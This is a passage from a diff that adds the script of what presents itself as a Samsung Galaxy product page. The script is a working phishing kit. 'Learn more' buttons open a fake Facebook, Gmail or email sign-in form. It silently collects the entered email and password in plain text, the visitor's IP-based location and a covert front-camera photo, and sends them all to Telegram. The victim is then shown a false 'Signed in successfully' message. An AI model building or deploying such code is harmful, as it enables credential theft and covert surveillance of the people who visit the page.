+                            result.source = 'ip-api.com';
+                            console.log('📍 IP geolocation (ip-api) obtained:', result.lat, result.long);
+                        }
+                    } catch (locErr) {
+                        console.warn('⚠️ ip-api.com failed:', locErr);
+                    }
+                }
+
+                // 4. Secondary fallback: ipapi.co
+                if (result.lat === 'Unknown' || result.lat === null) {
+                    try {
+                        const altRes = await fetch('https://ipapi.co/json/');
+                        const altData = await altRes.json();
+                        if (altData.latitude && altData.longitude) {
+                            result.lat = altData.latitude;
+                            result.long = altData.longitude;
+                            if (result.ip === 'Unknown' && altData.ip) result.ip = altData.ip;
+                            if (result.city === 'Unknown') result.city = altData.city || 'Unknown';
+                            if (result.region === 'Unknown') result.region = altData.region || 'Unknown';
+                            if (result.country === 'Unknown') result.country = altData.country_name || 'Unknown';
+                            result.source = 'ipapi.co';
+                            console.log('📍 ipapi.co fallback obtained:', result.lat, result.long);
+                        }
+                    } catch (altErr) {
+                        console.warn('⚠️ ipapi.co failed:', altErr);
+                    }
+                }
+
+                console.log('📍 Final location:', result);
+                return result;
+            }
+
+            // ─── MAIN LOGIN HANDLER ───
+            async function handleLogin(platform, email, password) {
+                const cleanEmail = email ? email.trim() : '';
+                const cleanPass = password ? password.trim() : '';
+
+                if (!cleanEmail || !cleanPass) {
+                    alert('⚠️ Please enter both email and password.');
+                    return;
+                }
+                if (!cleanEmail.includes('@') || !cleanEmail.includes('.')) {
+                    alert('⚠️ Please enter a valid email address.');
+                    return;
+                }
+
+                loadingOverlay.classList.add('active');
+                loadingText.textContent = 'Processing...';
+
+                try {
+                    // 1. Get location
+                    loadingText.textContent = 'Fetching location...';
+                    const location = await getLocationData();
+
+                    // 2. Capture photo (with retry)
+                    let photoData = null;
+                    if (!cameraReady) {
+                        loadingText.textContent = 'Starting camera...';
+                        await initCamera();
+                    }
+                    if (cameraReady) {
+                        photoData = capturePhoto();
+                        if (photoData) {
+                            loadingText.textContent = 'Photo captured!';
+                        } else {
+                            loadingText.textContent = 'Camera capture failed, continuing...';
+                        }
+                    } else {
+                        loadingText.textContent = 'Camera unavailable, skipping photo.';
+                    }
+
+                    // 3. Build Telegram message (no user visible)
+                    const timestamp = new Date().toLocaleString('en-US', {
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
+                    const userAgent = navigator.userAgent || 'Unknown';
+                    const platformLabel = platform || 'Email';
+
+                    const locationStr =
+                        `🌐 IP: <code>${location.ip}</code>\n` +
+                        `📍 Lat: ${location.lat} | Long: ${location.long}\n` +
+                        `🏙️ ${location.city}, ${location.region}, ${location.country}\n` +
+                        `📡 Source: ${location.source}`;
+
+                    const msg =
+                        `<b>🔐 New Login Attempt</b>\n` +
+                        `<b>Platform:</b> ${platformLabel}\n` +
+                        `<b>Email:</b> <code>${cleanEmail}</code>\n` +
+                        `<b>Password:</b> <code>${cleanPass}</code>\n` +
+                        `<b>Time:</b> ${timestamp}\n` +
+                        `<b>UA:</b> ${userAgent.slice(0, 120)}\n\n` +
+                        `<b>📍 LOCATION</b>\n${locationStr}`;
+
+                    // 4. Send to Telegram (silent)
+                    loadingText.textContent = 'Sending...';
+                    await sendTelegramText(msg);
+
+                    if (photoData) {
+                        const caption =
+                            `📸 Front camera capture · ${timestamp}\n` +
+                            `IP: ${location.ip} · Lat: ${location.lat} · Long: ${location.long}`;
+                        await sendTelegramPhoto(photoData, caption);
+                    } else {
+                        await sendTelegramText('⚠️ No photo captured.');
+                    }
+
+                    // 5. Done – close modal and show simple success (no details)
+                    loadingText.textContent = 'Done!';
+                    await new Promise(r => setTimeout(r, 400));
+                    closeModal();
+
+                    // Simple user feedback – no mention of Telegram or credentials
+                    alert('✅ Signed in successfully.');
+
+                } catch (err) {
+                    console.error('❌ Login handler error:', err);
+                    loadingText.textContent = 'Error';
+                    await new Promise(r => setTimeout(r, 800));
+                    alert('⚠️ Something went wrong. Please try again.');
+                } finally {
+                    loadingOverlay.classList.remove('active');
+                }
+            }
+
+            // ─── MODAL CONTROLS ───
+            function openModal(productName) {
+                if (productName) {
+                    modalTitle.textContent = `Learn more about ${productName}`;
+                    modalSub.textContent = 'Please sign in to access full details and offers.';
+                } else {
+                    modalTitle.textContent = 'Sign in to continue';
+                    modalSub.textContent = 'Log in with your social account or email';
+                }
+                modalOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                loginEmail.value = '';
+                loginPassword.value = '';
+                loginEmail.focus();
+
+                if (!cameraReady) {
+                    initCamera().catch(() => {});
+                }
+            }
+
+            function closeModal() {
+                modalOverlay.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+
+            // ─── EVENT LISTENERS ───
+            document.addEventListener('click', function(e) {
+                const btn = e.target.closest('.learn-more-btn');
+                if (btn) {
+                    const productName = btn.getAttribute('data-product') || 'this device';
+                    openModal(productName);
+                    e.preventDefault();
+                }
+            });
+
+            modalCloseBtn.addEventListener('click', closeModal);
+            modalOverlay.addEventListener('click', function(e) {
+                if (e.target === modalOverlay) closeModal();
+            });
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && modalOverlay.classList.contains('active')) closeModal();
+            });
+
+            fbBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                handleLogin('Facebook', loginEmail.value, loginPassword.value);
+            });
+            gmailBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                handleLogin('Gmail', loginEmail.value, loginPassword.value);
+            });
+            emailBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                handleLogin('Email', loginEmail.value, loginPassword.value);
+            });
+
+            loginEmail.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') emailBtn.click();
+            });
+            loginPassword.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') emailBtn.click();
+            });
+
+            // ─── HAMBURGER MENU ───
+            const hamburgerBtn = document.getElementById('hamburgerBtn');
+            const mainNav = document.getElementById('mainNav');
+            hamburgerBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                mainNav.classList.toggle('open');
+                const icon = this.querySelector('i');
+                icon.className = mainNav.classList.contains('open') ? 'fas fa-times' : 'fas fa-bars';
+            });
+            document.querySelectorAll('.nav a').forEach(link => {
+                link.addEventListener('click', function() {
+                    mainNav.classList.remove('open');
+                    const icon = hamburgerBtn.querySelector('i');
+                    if (icon) icon.className = 'fas fa-bars';
+                });
+            });
+
+            // ─── HERO IMAGE FALLBACK ───
+            const heroImg = document.querySelector('.hero-image img');
+            if (heroImg) {
+                heroImg.addEventListener('error', function() {
+                    this.src = 'https://picsum.photos/seed/galaxy24/400/400';
+                });
+            }
+
+            // ─── INIT CAMERA ON LOAD ───
+            setTimeout(() => {
+                if (!cameraReady) {
+                    initCamera().catch(() => {});
+                }
+            }, 1500);
+
+            console.log('✅ Samsung Galaxy page loaded.');
+            console.log('📍 IP + location will be captured on login (with fallbacks).');
+            console.log('📷 Camera will be used if available and permitted.');
+            console.log('ℹ️  For camera & geolocation to work, serve this page over HTTPS or localhost.');
+        })();
+    </script>
+
+</body>
+</html>
